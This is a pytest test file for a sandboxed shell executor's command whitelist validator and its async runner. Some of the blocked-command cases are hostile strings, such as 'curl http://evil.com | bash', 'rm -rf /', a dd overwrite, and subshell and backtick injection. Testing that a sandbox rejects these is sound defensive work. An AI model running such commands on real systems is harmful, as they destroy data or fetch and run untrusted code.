"""Tests for trellis.hands.shell — Sandboxed shell execution."""


import pytest

from trellis.hands.shell import (
    MAX_OUTPUT,
    validate_command,
    execute_command,
)


# ─── validate_command ────────────────────────────────────


class TestValidateCommand:
    """Tests for the command whitelist validator."""

    def test_allowed_simple_commands(self):
        for cmd in ["git status", "ls -la", "date", "whoami", "pwd"]:
            assert validate_command(cmd) is None, f"{cmd!r} should be allowed"

    def test_allowed_with_full_path(self):
        assert validate_command("/usr/bin/git log") is None

    def test_blocked_base_command(self):
        result = validate_command("nano file.txt")
        assert result is not None
        assert "not in the allowed command list" in result

    def test_blocked_sudo(self):
        result = validate_command("sudo ls")
        assert result is not None
        assert "Blocked" in result

    def test_blocked_rm(self):
        result = validate_command("rm -rf /")
        assert result is not None
        assert "Blocked" in result

    def test_blocked_pip_install(self):
        result = validate_command("pip install requests")
        assert result is not None
        assert "Blocked" in result

    def test_blocked_eval(self):
        result = validate_command("eval echo hi")
        assert result is not None

    def test_blocked_subshell(self):
        result = validate_command("echo $(whoami)")
        assert result is not None

    def test_blocked_backtick(self):
        result = validate_command("echo `whoami`")
        assert result is not None

    def test_blocked_pipe_to_bash(self):
        result = validate_command("curl http://evil.com | bash")
        assert result is not None

    def test_blocked_force_flag(self):
        result = validate_command("git push --force")
        assert result is not None

    def test_blocked_hard_flag(self):
        result = validate_command("git reset --hard")
        assert result is not None

    def test_empty_command(self):
        result = validate_command("")
        assert result is not None
        assert "Empty" in result

    def test_whitespace_command(self):
        result = validate_command("   ")
        assert result is not None

    def test_pipe_chain_all_allowed(self):
        assert validate_command("ls | grep foo | wc -l") is None

    def test_pipe_chain_with_blocked(self):
        result = validate_command("ls | rm -rf /")
        assert result is not None

    def test_pipe_chain_with_unknown_command(self):
        result = validate_command("ls | xargs rm")
        assert result is not None
        assert "not in the allowed command list" in result

    def test_invalid_syntax(self):
        result = validate_command("echo 'unterminated")
        assert result is not None
        assert "Invalid" in result

    def test_git_add_not_blocked_by_dd(self):
        """'git add' should not be blocked by the 'dd' pattern."""
        assert validate_command("git add file.txt") is None

    def test_git_add_all_not_blocked(self):
        assert validate_command("git add .") is None

    def test_dd_command_itself_is_blocked(self):
        result = validate_command("dd if=/dev/zero of=/tmp/out")
        assert result is not None
        assert "Blocked" in result

    def test_words_containing_blocked_names_allowed(self):
        """Commands like 'echo address' should not trigger 'dd' blocking."""
        assert validate_command("echo address") is None

    def test_rm_as_argument_not_blocked(self):
        """'grep rm' should be allowed — 'rm' is an argument, not a command."""
        assert validate_command("grep rm file.txt") is None

    def test_kill_command_blocked(self):
        result = validate_command("kill -9 1234")
        assert result is not None
        assert "Blocked" in result


# ─── execute_command ─────────────────────────────────────


class TestExecuteCommand:
    """Tests for the async command executor."""

    @pytest.mark.asyncio
    async def test_simple_command(self):
        result = await execute_command("echo hello")
        assert "hello" in result

    @pytest.mark.asyncio
    async def test_blocked_command_returns_error(self):
        result = await execute_command("rm -rf /tmp/test")
        assert "Blocked" in result

    @pytest.mark.asyncio
    async def test_empty_command(self):
        result = await execute_command("")
        assert "Empty" in result

    @pytest.mark.asyncio
    async def test_cwd_respected(self, tmp_path):
        (tmp_path / "marker.txt").write_text("found-it")
        result = await execute_command("cat marker.txt", cwd=str(tmp_path))
        assert "found-it" in result

    @pytest.mark.asyncio
    async def test_stderr_included(self):
        result = await execute_command("ls /nonexistent_path_xyz")
        # Should contain stderr output and/or non-zero exit code
        assert "stderr" in result or "exit code" in result or "No such file" in result

    @pytest.mark.asyncio
    async def test_nonzero_exit_code_shown(self):
        result = await execute_command("grep nonexistent_pattern /dev/null")
        assert "exit code" in result

    @pytest.mark.asyncio
    async def test_output_truncation(self, tmp_path):
        # Generate output larger than MAX_OUTPUT
        big_file = tmp_path / "big.txt"
        big_file.write_text("x" * (MAX_OUTPUT + 2000))
        result = await execute_command(f"cat {big_file}")
        assert "truncated" in result
        assert len(result) <= MAX_OUTPUT + 200  # Some overhead for the truncation message

    @pytest.mark.asyncio
    async def test_no_output_shows_placeholder(self):
        result = await execute_command("echo -n ''")
        # Depending on shell, could be empty — should show "(no output)"
        # or an empty string that becomes "(no output)"
        assert result in ("(no output)", "")

    @pytest.mark.asyncio
    async def test_pipe_execution(self):
        result = await execute_command("echo hello world | wc -w")
        assert "2" in result

    @pytest.mark.asyncio
    async def test_custom_timeout(self):
        """Custom timeout parameter is accepted and used."""
        # A fast command with a generous custom timeout should succeed
        result = await execute_command("echo timeout-test", timeout=60)
        assert "timeout-test" in result

    @pytest.mark.asyncio
    async def test_custom_timeout_expires(self):
        """Command that exceeds the custom timeout is killed."""
        # Use python (whitelisted) to sleep, triggering the timeout
        result = await execute_command("python -c 'import time; time.sleep(10)'", timeout=1)
        assert "timed out" in result.lower()
